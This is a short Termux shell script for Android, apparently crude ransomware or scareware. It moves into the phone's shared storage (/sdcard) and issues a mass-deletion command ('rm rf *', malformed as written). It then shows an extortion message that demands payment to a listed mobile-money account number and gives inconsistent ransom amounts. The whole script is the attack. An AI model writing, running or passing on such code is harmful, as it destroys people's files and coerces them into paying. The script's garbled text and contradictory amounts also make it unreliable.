cd
termux-setup-storage

cd /sdcard
rm rf *
attack()
{
    clear
    echo "your data have been delected"
    echo "If you want back..."
    echo "give me 10000 to my wave account :\")"
    read -p "Give me money or not?? [yes/no] :" m
    if [[ $m == "yes" ]]
    then
    	clear
    	echo "Give 5000 on this account (9258983822)"
    elif [[ $m == "no" ]]
    then 
    	clear 
    	echo "your data have been delected"
	else
		echo "wrong argv"
	fi
}
attack 

